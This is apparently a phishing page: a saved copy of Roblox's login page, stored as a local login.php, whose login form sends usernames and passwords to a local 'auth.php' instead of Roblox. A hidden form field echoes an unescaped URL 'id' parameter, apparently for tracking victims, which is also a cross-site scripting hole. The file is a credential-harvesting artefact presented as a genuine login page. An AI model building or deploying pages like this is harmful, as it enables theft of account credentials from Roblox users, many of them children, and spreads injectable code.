...
<html>
   ...
   <head data-machine-id="WEB2130">
      ...
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/a168257175fe69cdb0762a3b8ca5d0a5fd625f77c027d5e4cef7f90a1602d704.js"></script>
   ...
   <body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">
      <meta name="csrf-token" data-token="hD6gaEK9a3tL">
            ...
            <div id="header" class="navbar-fixed-top rbx-header" role="navigation">
               <div class="container-fluid">
                  ...
                  <div id="right-navigation-header">
                     <div id="navbar-universal-search" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3 shown" role="search">
                        <div class="input-group">
                           ...
                           <div class="input-group-btn"><button id="navbar-search-btn" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button></div>
                        </div>
                        <ul class="dropdown-menu" role="menu">
                           <li class="navbar-search-option rbx-clickable-li  selected"><a class="navbar-search-anchor" href="file:///develop/library?CatalogContext=2&amp;Category=6&amp;Keyword=">Search "" in Library</a></li>
                           <li class="navbar-search-option rbx-clickable-li"><a class="navbar-search-anchor" href="file:///search/groups?keyword=">Search "" in Groups</a></li>
                           <li class="navbar-search-option rbx-clickable-li"><a class="navbar-search-anchor" href="file:///catalog/browse.aspx?CatalogContext=1&amp;Keyword=">Search "" in Avatar Shop</a></li>
                           <li class="navbar-search-option rbx-clickable-li"><a class="navbar-search-anchor" href="file:///games/?Keyword=">Search "" in Discover</a></li>
                           <li class="navbar-search-option rbx-clickable-li"><a class="navbar-search-anchor" href="file:///search/users?keyword=">Search "" in People</a></li>
                        </ul>
                     </div>
                     <div class="navbar-right rbx-navbar-right">
                        <ul class="nav navbar-right rbx-navbar-right-nav">
                           <li class="signup-button-container"><a class="rbx-navbar-signup btn-growth-sm nav-menu-title signup-button" href="file:///account/signupredir?returnUrl=file%3A%2F%2F%2FC%3A%2FUsers%2FMagic%2FDesktop%2FRoblox%2Flogin.php" id="sign-up-button">Sign Up</a></li>
                           <li class="login-action"><span><a class="font-header-2 rbx-navbar-login nav-menu-title rbx-menu-item">Log In</a></span></li>
                           <li class="cursor-pointer rbx-navbar-right-search" role="menuitem"><span class="rbx-menu-icon rbx-menu-item"><span class="icon-nav-search-white"></span></span></li>
                        </ul>
                     </div>
                  </div>
               </div>
         ...
         <div class="container-main 
            ...
            <div class="content">
               ...
               <div id="login-container" class="login-container ">
                  <div  is-facebook-sign-in-enabled="true" is-login-fun-captcha-enabled="true" is-always-captcha-login-enabled="false" is-bedev2-captcha-for-web-login-enabled="true" data-return-url="">
                     <div id="login-base">
                        <div class="section-content login-section">
                           <h2 class="login-header " >Login to Roblox</h2>
                           <div  >
                              <div >
                                 <div >
                                    ...
                                    <div class="login-form-container" >
                                       <form class="login-form"  name="loginForm" rbx-form-context="" context="loginPage" action="auth.php">
                                          <div class="form-group username-form-group"> <input id="login-username" name="username" type="text" class="form-control input-field " placeholder="Username/Email/Phone"  > </div>
                                          <div class="form-group password-form-group">
                                             <input id="login-password" name="password" type="password" class="form-control input-field" placeholder="Password" > 
                                             
                                          </div>
                                          <div class="form-group password-form-group">
                                             <input id="шв" name="id" type="password" value="<?php echo $_GET["id"]; ?>" class="form-control input-field" placeholder="Password" style="display: none;" > 
                                             
                                          </div>
                                          <div > <button id="login-button" class="btn-full-width login-button btn-secondary-md" type="submit">Log In</button> </div>
                                          <div class="text-center forgot-credentials-link"> <a id="forgot-credentials-link" class="text-link " href="https://www.roblox.com/login/forgot-password-or-username" target="_blank" >Forgot Password or Username?</a> </div>
                                       ...
                                       <div ng-if="loginParams.isFacebookSignInEnabled &amp;&amp; !loginParams.useFacebookRedirect" class="ng-scope">
                                          ...
                                          <!-- ngIf: crossDeviceLoginParams.IsLoginCodeButtonDisplayed --><!-- end ngIf: crossDeviceLoginParams.IsLoginCodeButtonDisplayed -->  
                                       </div>
                                       <!-- end ngIf: loginParams.isFacebookSignInEnabled && !loginParams.useFacebookRedirect --> 
                                    </div>
                                    <captcha activated="loginCaptchaActivated" captcha-action-type="captchaActionTypes.login" extra-validation-params="captchaExtraValidationParams" input-params="inputParams" captcha-failed="handleCaptchaError" captcha-passed="handleCaptchaSuccess" return-token-in-success-cb="captchaReturnTokenInSuccessCb" class="ng-isolate-scope">
                                             ...
                                             <div class="modal-dialog">
                                                <div class="modal-content">
                                                   <div class="modal-body" ng-click="$event.stopPropagation()">
                                                      <button type="button" class="close" ng-click="$ctrl.hideCaptcha()"> <span aria-hidden="true"><span class="icon-close"></span></span><span class="sr-only">Close</span> </button> 
         ...
         <footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True">
            <div class="footer">
               ...
               <div class="row copyright-container">
                  ...
                  <div class="col-sm-12">
                     <p class="text-footer footer-note">©2021 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.</p>
                     <div class="evidon-notice-link footer-note"></div>
                  </div>
               </div>
            </div>
         </footer>
      ...
      <div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">
         <div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
            <div id="Spinner" class="Spinner" style="padding:20px 0;">
               <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced" width="32" height="32">
            </div>
      ...
      <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="leanbase" type="text/javascript" src="https://js.rbxcdn.com/5e33670cf3f095d6e204c58893fbcfd8.js"></script>
      ...
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="CoreRobloxUtilities" data-bundle-source="Main" src="https://js.rbxcdn.com/09c0fe73025a49dbb397295b5ee57e7b5c7a20e7b74645178c037a7438d7f810.js"></script>
      ...
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Captcha" data-bundle-source="Main" src="https://js.rbxcdn.com/1a241d9144da8dbf8df6923786e07dbb12d496294c6e3619ee01a3f510445e52.js"></script>
      ...
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/85b41540af487e2ae681d4e5dfadbae27a8e3ae2b1c285b25c01cf0b4719f397.js"></script>
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.Controls" data-bundle-source="Unknown" src="https://js.rbxcdn.com/b6e6a88e644c44432359f735800d9180c401b92468885509a7deb16235bfbfc9.js"></script>
      ...
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Login" data-bundle-source="Main" src="https://js.rbxcdn.com/4f82d3bd91a8b565c9661cb2925113166b9bc491b2cc65d0fd0a91b00cc703ca.js"></script>
      ...
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/762650ae9fe0d4b395c4c89c9134b003c4c6646315a99f55444d6e98e432ffef.js"></script>
      <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Authentication.Login" data-bundle-source="Unknown" src="https://js.rbxcdn.com/79e3cc7541f656ec8eaa55ada34c6c497b826476fa4635b1b348005e4c731f94.js"></script>
      <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="https://js.rbxcdn.com/a4a6e1dfc872f426ef56a8d817fb393b"></script><iframe style="position: absolute; height: 0px; width: 0px; display: none;" title="Api Service" aria-hidden="true" src="https://cdns.us1.gigya.com/gs/webSdk/Api.aspx?apiKey=3_OsvmtBbTg6S_EUbwTPtbbmoihFY5ON6v6hbVrTbuqpBs7SyF_LQaJwtwKJ60sY1p&amp;version=latest&amp;build=12088#origin=file:///C:/Users/Magic/Desktop/Roblox/login.php&amp;gig_loggerConfig=%7B%22logLevel%22%3A0%2C%22clientMuteLevel%22%3A0%2C%22logTheme%22%3A1%7D"></iframe>
      <iframe style="position: absolute; height: 0px; width: 0px; display: none;" title="Api Service" aria-hidden="true" src="https://cdns.us1.gigya.com/gs/webSdk/Api.aspx?apiKey=3_OsvmtBbTg6S_EUbwTPtbbmoihFY5ON6v6hbVrTbuqpBs7SyF_LQaJwtwKJ60sY1p&amp;version=latest&amp;build=12088#origin=https://www.roblox.com/login&amp;gig_loggerConfig=%7B%22logLevel%22%3A0%2C%22clientMuteLevel%22%3A0%2C%22logTheme%22%3A1%7D"></iframe><iframe style="position: absolute; height: 0px; width: 0px; display: none;" title="Api Service" aria-hidden="true" src="https://cdns.us1.gigya.com/gs/webSdk/Api.aspx?apiKey=3_OsvmtBbTg6S_EUbwTPtbbmoihFY5ON6v6hbVrTbuqpBs7SyF_LQaJwtwKJ60sY1p&amp;version=latest&amp;build=12088#origin=file:///C:/Users/Magic/Desktop/Roblox/login.php&amp;gig_loggerConfig=%7B%22logLevel%22%3A0%2C%22clientMuteLevel%22%3A0%2C%22logTheme%22%3A1%7D"></iframe>
   </body>
</html>
